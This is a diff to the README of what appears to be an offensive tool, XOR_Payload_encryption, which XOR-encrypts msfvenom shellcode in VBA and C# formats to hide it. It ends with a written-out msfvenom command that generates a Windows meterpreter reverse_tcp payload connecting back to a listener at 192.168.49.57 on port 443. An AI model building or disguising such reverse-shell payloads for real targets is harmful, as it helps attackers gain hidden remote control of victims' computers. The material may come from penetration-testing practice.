@@ -1,6 +1,13 @@
 # XOR_Payload_encryption
-This project is ment to be use as an encryptor shellcode produced by msfvenom for "-f vbapplication" and "-f csharp"
+This project is ment to be use as an encryptor shellcode produced by msfvenom for :
 
+"-f vbapplication" 
+"-f csharp"
+
+
+
+
+it does automatically detect the payload format.
 
 
 ➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.57 LPORT=443 EXITFUNC=thread -f vbapplication
